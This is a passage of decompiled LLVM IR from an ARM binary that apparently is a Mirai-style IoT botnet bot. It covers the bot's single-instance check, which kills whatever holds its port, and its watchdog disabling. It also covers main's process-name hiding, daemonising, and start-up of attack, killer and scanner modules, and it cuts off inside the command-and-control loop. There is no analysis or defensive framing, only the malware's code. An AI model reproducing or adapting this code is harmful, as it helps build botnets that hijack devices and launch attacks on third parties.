define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_e7a8 = load i32, i32* @r6, align 4
  %v12_e7a8 = load i32, i32* @r7, align 4
  %v15_e7a8 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_23474.120 to i32), i32* @r6, align 4
  %v7_e7cc = icmp eq i32 %v3_e7c4, -1
  store i32 %v3_e7c4, i32* @global_var_23474.120, align 4
  br i1 %v7_e7cc, label %dec_label_pc_e884, label %dec_label_pc_e7d8

dec_label_pc_e7d8:                                ; preds = %entry
  %v2_e7d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e7d8, i32* @r3, align 4
  %v0_e7dc = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_e7ec = call i32 @__GI_setsockopt(i32 %v3_e7c4, i32 %v0_e7dc, i32 2, i32 %v2_e7d8, i32 4)
  %v2_e7f0 = load i32, i32* @global_var_23474.120, align 4
  store i32 %v2_e7f0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_e800 = call i32 @__libc_fcntl(i32 %v2_e7f0, i32 3)
  %v0_e804 = load i32, i32* @r5, align 4
  %v1_e808 = or i32 %v2_e800, 2048
  store i32 %v1_e808, i32* @r2, align 4
  %v0_e80c = load i32, i32* @r4, align 4
  %v2_e810 = call i32 @__libc_fcntl(i32 %v0_e80c, i32 %v0_e804)
  store i32 ptrtoint (i8** @global_var_23480.122 to i32), i32* @r8, align 4
  %v2_e818 = load i8, i8* bitcast (i8** @global_var_23480.122 to i8*), align 4
  %v2_e81c = icmp eq i8 %v2_e818, 0
  br i1 %v2_e81c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_e7d8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_e7d8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_e840 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_e848 = inttoptr i32 %v0_e840 to i32*
  store i32 0, i32* %v2_e848, align 4
  %v2_e84c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e84c, i32* @r5, align 4
  store i32 %v0_e840, i32* @r4, align 4
  %v2_e85c = load i32, i32* @global_var_23474.120, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e868 = call i32 @bind(i32 %v2_e85c, i32 %v2_e84c, i32 16)
  %v7_e86c = icmp eq i32 %v3_e868, -1
  br i1 %v7_e86c, label %dec_label_pc_e890, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %bb20
  %v2_e87c = load i32, i32* @global_var_23474.120, align 4
  %v2_e880 = call i32 @listen(i32 %v2_e87c, i32 1)
  br label %dec_label_pc_e884

dec_label_pc_e884:                                ; preds = %entry, %dec_label_pc_e89c, %dec_label_pc_e874
  %v1_e88c = phi i32 [ %v3_e7c4, %entry ], [ %v1_e8e4, %dec_label_pc_e89c ], [ %v2_e880, %dec_label_pc_e874 ]
  store i32 %v9_e7a8, i32* @r6, align 4
  store i32 %v12_e7a8, i32* @r7, align 4
  store i32 %v15_e7a8, i32* @r8, align 4
  ret i32 %v1_e88c

dec_label_pc_e890:                                ; preds = %bb20
  %v0_e890 = load i32, i32* @r4, align 4
  %v1_e890 = inttoptr i32 %v0_e890 to i32*
  %v2_e890 = load i32, i32* %v1_e890, align 4
  %v7_e894 = icmp eq i32 %v2_e890, 99
  br i1 %v7_e894, label %dec_label_pc_e8ec, label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e8ec, %bb21, %dec_label_pc_e890
  %v2_e8b4 = load i32, i32* @global_var_23474.120, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e8c4 = call i32 @__libc_connect(i32 %v2_e8b4, i32 %v2_e84c, i32 16)
  %v1_e8cc = call i32 @sleep(i32 5)
  %v2_e8d0 = load i32, i32* @global_var_23474.120, align 4
  %v1_e8d4 = call i32 @__GI___libc_close(i32 %v2_e8d0)
  %v1_e8e0 = call i32 @killer_kill_by_port(i32 50951)
  %v1_e8e4 = call i32 @ensure_single_instance(i32 %v1_e8e0)
  br label %dec_label_pc_e884

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e890
  %v2_e8ec = load i8, i8* bitcast (i8** @global_var_23480.122 to i8*), align 4
  %v3_e8ec = zext i8 %v2_e8ec to i32
  %v1_e8f0 = load i32, i32* @r7, align 4
  %v9_e8f0 = icmp eq i32 %v3_e8ec, %v1_e8f0
  br i1 %v9_e8f0, label %dec_label_pc_e89c, label %bb21

bb21:                                             ; preds = %dec_label_pc_e8ec
  %v2_e8f8 = trunc i32 %v1_e8f0 to i8
  store i8 %v2_e8f8, i8* bitcast (i8** @global_var_23480.122 to i8*), align 4
  br label %dec_label_pc_e89c

; uselistorder directives
  uselistorder i32 %v2_e84c, { 1, 0, 2 }
  uselistorder i32 %v3_e7c4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_23480.122 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_23480.122, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e884, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @watchdog_maintain(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_e90c = load i32, i32* @r4, align 4
  %v6_e90c = load i32, i32* @r5, align 4
  %v9_e90c = load i32, i32* @lr, align 4
  %v0_e914 = call i32 @__libc_fork()
  %v7_e918 = icmp eq i32 %v0_e914, -1
  %. = zext i1 %v7_e918 to i32
  %tmp12 = icmp slt i32 %v0_e914, 1
  %storemerge4 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_e934 = icmp eq i32 %storemerge4, 0
  store i32 %v0_e914, i32* @global_var_235f8.125, align 4
  br i1 %v2_e934, label %dec_label_pc_e94c, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %entry
  store i32 %v3_e90c, i32* @r4, align 4
  store i32 %v6_e90c, i32* @r5, align 4
  store i32 %v9_e90c, i32* @lr, align 4
  ret i32 %v0_e914

dec_label_pc_e94c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_e958 = call i32 @table_unlock_val(i32 59)
  %v1_e960 = call i32 @table_unlock_val(i32 60)
  %v0_e964 = load i32, i32* @r5, align 4
  %v2_e96c = inttoptr i32 %v0_e964 to i32*
  %v3_e96c = call i32 @table_retrieve_val(i32 59, i32* %v2_e96c)
  %v2_e974 = call i32 @__libc_open(i32 %v3_e96c, i32 2)
  %v7_e978 = icmp eq i32 %v2_e974, -1
  store i32 %v2_e974, i32* @r4, align 4
  br i1 %v7_e978, label %dec_label_pc_e9c0, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e94c
  %v0_e990 = phi i32 [ %v2_e9d0, %dec_label_pc_e9c0 ], [ %v2_e974, %dec_label_pc_e94c ]
  %v2_e994 = ptrtoint i32* %stack_var_-20 to i32
  %v3_e998 = call i32 @ioctl(i32 %v0_e990, i32 -2147199228, i32 %v2_e994)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e99c, %dec_label_pc_e984
  %v0_e9a8 = load i32, i32* @r4, align 4
  %v3_e9b0 = call i32 @ioctl(i32 %v0_e9a8, i32 -2147199227, i32 0)
  %v1_e9b8 = call i32 @sleep(i32 10)
  br label %dec_label_pc_e99c

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e94c
  %v0_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c8 = inttoptr i32 %v0_e9c0 to i32*
  %v3_e9c8 = call i32 @table_retrieve_val(i32 60, i32* %v2_e9c8)
  %v2_e9d0 = call i32 @__libc_open(i32 %v3_e9c8, i32 2)
  %v3_e9d4 = icmp eq i32 %v2_e9d0, -1
  store i32 %v2_e9d0, i32* @r4, align 4
  br i1 %v3_e9d4, label %dec_label_pc_e9e0, label %dec_label_pc_e984

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9c0
  %v1_e9e4 = call i32 @table_lock_val(i32 59)
  %v1_e9ec = call i32 @table_lock_val(i32 60)
  %v0_e9f0 = load i32, i32* @r5, align 4
  %v1_e9f4 = call i32 @__GI_exit(i32 %v0_e9f0)
  %v0_e9f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e9f8, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_e9e0
  %v1_e9f8 = load i32, i32* @r3, align 4
  store i32 %v1_e9f8, i32* %arg1, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_e9e0, %bb15
  ret i32 %v1_e9f4

; uselistorder directives
  uselistorder i32 %v2_e9d0, { 1, 2, 0 }
  uselistorder i32 %v2_e974, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_e914, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 59, { 0, 1, 2, 4, 3 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_ea0c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ea0c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_ea24 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  store i32 %v2_ea0c, i32* @r0, align 4
  %v2_ea30 = call i32 @__GI_sigaddset(i32 %v2_ea0c, i32 2)
  %v0_ea34 = load i32, i32* @r5, align 4
  store i32 %v0_ea34, i32* %r2.global-to-local, align 4
  %v4_ea40 = call i32 @__GI_sigprocmask(i32 %v0_ea34, i32* nonnull %stack_var_-64, i32 %v0_ea34)
  %v2_ea4c = call i32 @bsd_signal(i32 17, i32 1)
  %v2_ea58 = call i32 @bsd_signal(i32 5, i32 59212)
  %v0_ea5c = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_26114.115 to i32), i32* %r2.global-to-local, align 4
  store i32 -583215265, i32* @global_var_26118.117, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_ea5c, i32* @global_var_2610c.91, align 4
  store i16 5888, i16* bitcast (i32* @global_var_26116.118 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_26114.115 to i16*), align 4
  %v6_ea8c = call i32 @table_init(i32 %v0_ea5c, i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32 ptrtoint (i16** @global_var_26114.115 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2347c.113 to i32), i32* @lr, align 4
  %v2_ea98 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_ea98, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* @global_var_2347c.113, align 4
  %v1_eaa0 = call i32 @ensure_single_instance(i32 %v6_ea8c)
  %v1_eaa4 = call i32 @rand_init(i32 %v1_eaa0)
  %v2_eab0 = call i32 @util_zero(i32 %v2_ea98, i32 32)
  %v0_eab4 = load i32, i32* @r6, align 4
  %v7_eab4 = icmp eq i32 %v0_eab4, 2
  br i1 %v7_eab4, label %dec_label_pc_ebe4, label %dec_label_pc_eabc

dec_label_pc_eabc:                                ; preds = %dec_label_pc_ebe4, %entry, %dec_label_pc_ebf4
  %v0_eabc = call i32 @rand_next()
  store i32 %v0_eabc, i32* @r6, align 4
  %v0_eac4 = load i32, i32* @r8, align 4
  %v1_eac4 = inttoptr i32 %v0_eac4 to i32*
  %v2_eac4 = load i32, i32* %v1_eac4, align 4
  %v1_eac8 = inttoptr i32 %v2_eac4 to i8*
  %v2_eac8 = call i32 @util_strlen(i8* %v1_eac8)
  %v0_ead0 = load i32, i32* @r8, align 4
  %v1_ead0 = inttoptr i32 %v0_ead0 to i32*
  %v2_ead0 = load i32, i32* %v1_ead0, align 4
  %v1_ead4 = inttoptr i32 %v2_ead0 to i8*
  %v2_ead4 = call i32 @util_strlen(i8* %v1_ead4)
  %v1_ead8 = sub i32 20, %v2_eac8
  %v0_eae0 = load i32, i32* @r6, align 4
  %v3_eae4 = urem i32 %v0_eae0, %v1_ead8
  %v2_eae8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_eae8, i32* @r5, align 4
  %v2_eaec = add i32 %v3_eae4, %v2_ead4
  store i32 %v2_eaec, i32* @r4, align 4
  %v2_eaf8 = call i32 @rand_alphastr(i32 %v2_eae8, i32 %v2_eaec)
  %v2_eafc = ptrtoint i32* %stack_var_-40 to i32
  %v1_eb00 = load i32, i32* @r4, align 4
  %v2_eb00 = add i32 %v1_eb00, %v2_eafc
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_eb0c = load i32, i32* @r8, align 4
  %v1_eb0c = inttoptr i32 %v0_eb0c to i32*
  %v2_eb0c = load i32, i32* %v1_eb0c, align 4
  store i32 %v2_eb0c, i32* @r0, align 4
  %v3_eb10 = add i32 %v2_eb00, -80
  %v4_eb10 = inttoptr i32 %v3_eb10 to i8*
  store i8 0, i8* %v4_eb10, align 1
  %v2_eb14 = inttoptr i32 %v2_eb0c to i8*
  %v3_eb14 = call i32 @util_strcpy(i8* %v2_eb14, i32 %v2_eae8)
  %v2_eb20 = call i32 @util_zero(i32 %v2_eae8, i32 32)
  %v0_eb24 = call i32 @rand_next()
  store i32 %v0_eb24, i32* @r7, align 4
  %v0_eb2c = load i32, i32* @r8, align 4
  %v1_eb2c = inttoptr i32 %v0_eb2c to i32*
  %v2_eb2c = load i32, i32* %v1_eb2c, align 4
  %v1_eb30 = inttoptr i32 %v2_eb2c to i8*
  %v2_eb30 = call i32 @util_strlen(i8* %v1_eb30)
  store i32 %v2_eb30, i32* @r6, align 4
  %v0_eb38 = load i32, i32* @r8, align 4
  %v1_eb38 = inttoptr i32 %v0_eb38 to i32*
  %v2_eb38 = load i32, i32* %v1_eb38, align 4
  %v1_eb3c = inttoptr i32 %v2_eb38 to i8*
  %v2_eb3c = call i32 @util_strlen(i8* %v1_eb3c)
  %v0_eb40 = load i32, i32* @r6, align 4
  %v1_eb40 = sub i32 20, %v0_eb40
  %v0_eb48 = load i32, i32* @r7, align 4
  %v3_eb4c = urem i32 %v0_eb48, %v1_eb40
  %v2_eb50 = add i32 %v3_eb4c, %v2_eb3c
  store i32 %v2_eb50, i32* @r4, align 4
  %v2_eb5c = call i32 @rand_alphastr(i32 %v2_eae8, i32 %v2_eb50)
  store i32 %v2_eafc, i32* %r2.global-to-local, align 4
  %v1_eb64 = load i32, i32* @r4, align 4
  %v2_eb64 = add i32 %v1_eb64, %v2_eafc
  store i32 %v2_eb64, i32* %r3.global-to-local, align 4
  %v0_eb68 = load i32, i32* @sl, align 4
  %v1_eb68 = trunc i32 %v0_eb68 to i8
  %v3_eb68 = add i32 %v2_eb64, -80
  %v4_eb68 = inttoptr i32 %v3_eb68 to i8*
  store i8 %v1_eb68, i8* %v4_eb68, align 1
  %v4_eb74 = call i32 @prctl(i32 15, i32 %v2_eae8, i32 %v2_eafc, i32 %v2_eb64)
  %v1_eb7c = call i32 @table_unlock_val(i32 5)
  %v3_eb8c = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_eb90 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_eb90, i32* @r2, align 4
  %v2_eb9c = call i32 @__GI___libc_write(i32 1, i32 %v3_eb8c)
  store i32 1, i32* @r2, align 4
  %v2_ebac = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1a7c8.132 to i32))
  %v1_ebb4 = call i32 @table_lock_val(i32 5)
  %v1_ebb8 = call i32 @attack_init(i32 %v1_ebb4)
  %v1_ebbc = call i32 @killer_init(i32 %v1_ebb8)
  %v1_ebc0 = inttoptr i32 %v1_ebbc to i32*
  %v2_ebc0 = call i32 @watchdog_maintain(i32* %v1_ebc0)
  %v0_ebc4 = call i32 @__libc_fork()
  %v1_ebc8 = load i32, i32* @sl, align 4
  %v7_ebcc = icmp sgt i32 %v0_ebc4, %v1_ebc8
  br i1 %v7_ebcc, label %dec_label_pc_ebd0, label %dec_label_pc_ec1c

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eabc
  ret i32 %v1_ebc8

dec_label_pc_ebe4:                                ; preds = %entry
  %v0_ebe4 = load i32, i32* @r8, align 4
  %v1_ebe4 = add i32 %v0_ebe4, 4
  %v2_ebe4 = inttoptr i32 %v1_ebe4 to i32*
  %v3_ebe4 = load i32, i32* %v2_ebe4, align 4
  %v1_ebe8 = inttoptr i32 %v3_ebe4 to i8*
  %v2_ebe8 = call i32 @util_strlen(i8* %v1_ebe8)
  %v8_ebf0 = icmp sgt i32 %v2_ebe8, 31
  br i1 %v8_ebf0, label %dec_label_pc_eabc, label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebe4
  %v0_ebf4 = load i32, i32* @r8, align 4
  %v1_ebf4 = add i32 %v0_ebf4, 4
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  %v3_ebf4 = load i32, i32* %v2_ebf4, align 4
  store i32 %v2_ea98, i32* @r0, align 4
  %v2_ebfc = bitcast i32* %stack_var_-152 to i8*
  %v3_ebfc = call i32 @util_strcpy(i8* %v2_ebfc, i32 %v3_ebf4)
  %v0_ec00 = load i32, i32* @r8, align 4
  %v1_ec00 = add i32 %v0_ec00, 4
  %v2_ec00 = inttoptr i32 %v1_ec00 to i32*
  %v3_ec00 = load i32, i32* %v2_ec00, align 4
  %v1_ec08 = inttoptr i32 %v3_ec00 to i8*
  %v2_ec08 = call i32 @util_strlen(i8* %v1_ec08)
  %v2_ec14 = call i32 @util_zero(i32 %v3_ec00, i32 %v2_ec08)
  br label %dec_label_pc_eabc

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_eabc
  %v1_ec1c = call i32 @__GI_setsid(i32 %v0_ebc4)
  %v0_ec24 = load i32, i32* @sl, align 4
  %v1_ec28 = call i32 @__GI___libc_close(i32 %v0_ec24)
  %v1_ec30 = call i32 @__GI___libc_close(i32 1)
  %v1_ec38 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_23478.134 to i32), i32* @fp, align 4
  %v1_ec40 = call i32 @attack_init(i32 %v1_ec38)
  %v1_ec44 = call i32 @killer_init(i32 %v1_ec40)
  %v1_ec48 = inttoptr i32 %v1_ec44 to i32*
  %v2_ec48 = call i32 @watchdog_maintain(i32* %v1_ec48)
  %v1_ec4c = call i32 @scanner_init(i32 %v2_ec48)
  %v0_ec50 = load i32, i32* @sl, align 4
  %v2_ec54 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ec54, i32* @r7, align 4
  %v2_ec58 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ec58, i32* @r6, align 4
  %v2_ed38 = ptrtoint i32* %stack_var_-72 to i32
  %v2_ed88 = ptrtoint i32* %stack_var_-168 to i32
  %v2_ef64 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ef6c = ptrtoint i8** %stack_var_-42 to i32
  %v2_f114 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_ef88 = ptrtoint i32* %stack_var_-52 to i32
  %v1_f03c = bitcast i32* %stack_var_-152 to i8*
  %v2_effc = ptrtoint i32* %stack_var_-88 to i32
  %v1_f018 = sub i32 0, %v1_ec1c
  br label %dec_label_pc_ec5c

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_f09c, %dec_label_pc_f138, %bb44, %dec_label_pc_f038, %dec_label_pc_ee6c, %dec_label_pc_ee5c, %bb41, %dec_label_pc_f18c, %dec_label_pc_f0f8, %dec_label_pc_f0ac, %dec_label_pc_f088, %dec_label_pc_efb4, %dec_label_pc_eedc, %dec_label_pc_ee14, %dec_label_pc_ec1c
  %stack_var_-1436.0 = phi i32 [ %v0_ec50, %dec_label_pc_ec1c ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_ee5c ], [ %stack_var_-1436.1, %dec_label_pc_ee6c ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_f0ac ], [ %stack_var_-1436.1, %dec_label_pc_eedc ], [ %stack_var_-1436.1, %dec_label_pc_f138 ], [ %stack_var_-1436.1, %dec_label_pc_f18c ], [ %stack_var_-1436.1, %dec_label_pc_f0f8 ], [ %stack_var_-1436.1, %dec_label_pc_ee14 ], [ %stack_var_-1436.1, %dec_label_pc_f038 ], [ %stack_var_-1436.1, %dec_label_pc_f088 ], [ %stack_var_-1436.1, %dec_label_pc_efb4 ], [ %stack_var_-1436.1, %dec_label_pc_f09c ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec68, %dec_label_pc_ec5c
  %v1_ec6c = phi i32 [ %v1_ec70, %dec_label_pc_ec68 ], [ 4, %dec_label_pc_ec5c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ec6c = load i32, i32* @r7, align 4
  %v3_ec6c = add i32 %v2_ec6c, %v1_ec6c
  %v4_ec6c = inttoptr i32 %v3_ec6c to i32*
  store i32 0, i32* %v4_ec6c, align 4
  %v0_ec70 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec70 = add i32 %v0_ec70, 4
  store i32 %v1_ec70, i32* %r3.global-to-local, align 4
  %v7_ec74 = icmp eq i32 %v1_ec70, 128
  br i1 %v7_ec74, label %dec_label_pc_ec7c, label %dec_label_pc_ec68

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec68
  %v0_ec7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ec7c, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec84

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec84, %dec_label_pc_ec7c
  %v1_ec88 = phi i32 [ %v1_ec8c, %dec_label_pc_ec84 ], [ 4, %dec_label_pc_ec7c ]
  store i32 0, i32* @r4, align 4
  %v2_ec88 = load i32, i32* @r6, align 4
  %v3_ec88 = add i32 %v2_ec88, %v1_ec88
  %v4_ec88 = inttoptr i32 %v3_ec88 to i32*
  store i32 0, i32* %v4_ec88, align 4
  %v0_ec8c = load i32, i32* %r3.global-to-local, align 4
  %v1_ec8c = add i32 %v0_ec8c, 4
  store i32 %v1_ec8c, i32* %r3.global-to-local, align 4
  %v7_ec90 = icmp eq i32 %v1_ec8c, 128
  br i1 %v7_ec90, label %dec_label_pc_ec98, label %dec_label_pc_ec84

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec84
  store i32 ptrtoint (i32* @global_var_23474.120 to i32), i32* %r3.global-to-local, align 4
  %v2_ec9c = load i32, i32* @global_var_23474.120, align 4
  %v7_eca0 = icmp eq i32 %v2_ec9c, -1
  br i1 %v7_eca0, label %dec_label_pc_eccc, label %dec_label_pc_eca8

dec_label_pc_eca8:                                ; preds = %dec_label_pc_ec98
  %v3_eca8 = udiv i32 %v2_ec9c, 32
  %v3_ecac = mul nuw nsw i32 %v3_eca8, 4
  store i32 %v2_eafc, i32* %ip.global-to-local, align 4
  %v2_ecb4 = add i32 %v3_ecac, %v2_eafc
  store i32 %v2_ecb4, i32* %r3.global-to-local, align 4
  %v1_ecb8 = add i32 %v2_ecb4, -240
  %v2_ecb8 = inttoptr i32 %v1_ecb8 to i32*
  %v3_ecb8 = load i32, i32* %v2_ecb8, align 4
  %v1_ecbc = urem i32 %v2_ec9c, 32
  %v7_ecc4 = shl i32 1, %v1_ecbc
  %v8_ecc4 = or i32 %v3_ecb8, %v7_ecc4
  store i32 %v8_ecc4, i32* %r2.global-to-local, align 4
  store i32 %v8_ecc4, i32* %v2_ecb8, align 4
  br label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ec98, %dec_label_pc_eca8
  %v2_eccc = load i32, i32* @global_var_23478.134, align 4
  store i32 %v2_eccc, i32* @r3, align 4
  %v7_ecd0 = icmp eq i32 %v2_eccc, -1
  store i32 ptrtoint (i32* @global_var_23478.134 to i32), i32* @r8, align 4
  br i1 %v7_ecd0, label %dec_label_pc_eef4, label %dec_label_pc_ecdc

dec_label_pc_ecdc:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_eccc, %bb43
  %v2_ece0 = load i8, i8* bitcast (i8** @global_var_235fc.137 to i8*), align 4
  %v2_ece4 = icmp eq i8 %v2_ece0, 0
  %v2_ee30 = load i32, i32* @global_var_23478.134, align 4
  store i32 %v2_ee30, i32* %ip.global-to-local, align 4
  %v3_ee34 = udiv i32 %v2_ee30, 32
  store i32 %v3_ee34, i32* %r3.global-to-local, align 4
  br i1 %v2_ece4, label %dec_label_pc_ee30, label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_ecdc
  %v3_ecf8 = mul nuw nsw i32 %v3_ee34, 4
  %v2_ecfc = add i32 %v3_ecf8, %v2_eafc
  store i32 %v2_ecfc, i32* %r3.global-to-local, align 4
  %v1_ed00 = add i32 %v2_ecfc, -368
  %v2_ed00 = inttoptr i32 %v1_ed00 to i32*
  %v3_ed00 = load i32, i32* %v2_ed00, align 4
  %v1_ed04 = urem i32 %v2_ee30, 32
  %v7_ed0c = shl i32 1, %v1_ed04
  %v8_ed0c = or i32 %v3_ed00, %v7_ed0c
  store i32 %v8_ed0c, i32* %r2.global-to-local, align 4
  store i32 %v8_ed0c, i32* %v2_ed00, align 4
  br label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ee30, %dec_label_pc_ecec
  store i32 ptrtoint (i32* @global_var_23474.120 to i32), i32* %r3.global-to-local, align 4
  %v2_ed18 = load i32, i32* @global_var_23474.120, align 4
  store i32 0, i32* @lr, align 4
  %v0_ed20 = load i32, i32* %ip.global-to-local, align 4
  %v5_ed24 = icmp slt i32 %v0_ed20, %v2_ed18
  br i1 %v5_ed24, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_ed14
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_ed14, %bb
  %v0_ed34 = phi i32 [ %v2_ed18, %dec_label_pc_ed14 ], [ %v0_ed20, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_ed34 = add i32 %v0_ed34, 1
  store i32 %v2_ed38, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ec58, i32* %r2.global-to-local, align 4
  %v5_ed50 = call i32 @__libc_select(i32 %v1_ed34, i32 %v2_ec54, i32 %v2_ec58, i32 0, i32 %v2_ed38)
  %v8_ed54 = icmp eq i32 %v5_ed50, -1
  br i1 %v8_ed54, label %dec_label_pc_ec5c, label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %bb41
  %v6_ed50 = trunc i32 %v5_ed50 to i16
  %v3_ed5c = icmp eq i16 %v6_ed50, 0
  br i1 %v3_ed5c, label %dec_label_pc_ed64, label %dec_label_pc_ed98

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed5c
  %v5_ed70 = srem i32 %stack_var_-1436.0, 6
  %v4_ed78 = sub i32 %stack_var_-1436.0, %v5_ed70
  store i32 %v4_ed78, i32* %r3.global-to-local, align 4
  %v2_ed80 = icmp eq i32 %v5_ed70, 0
  %v1_ed84 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_ed84, i32* @lr, align 4
  store i32 %v2_ed88, i32* %r2.global-to-local, align 4
  %v7_ed8c = inttoptr i32 %v5_ed50 to i8*
  store i8* %v7_ed8c, i8** %stack_var_-42, align 4
  br i1 %v2_ed80, label %dec_label_pc_ef64, label %dec_label_pc_ed98

dec_label_pc_ed98:                                ; preds = %dec_label_pc_ed5c, %dec_label_pc_ed64, %dec_label_pc_ef64
  %stack_var_-1436.1 = phi i32 [ %v1_ed84, %dec_label_pc_ef64 ], [ %v1_ed84, %dec_label_pc_ed64 ], [ %stack_var_-1436.0, %dec_label_pc_ed5c ]
  store i32 ptrtoint (i32* @global_var_23474.120 to i32), i32* %r3.global-to-local, align 4
  %v2_ed9c = load i32, i32* @global_var_23474.120, align 4
  %v7_eda0 = icmp eq i32 %v2_ed9c, -1
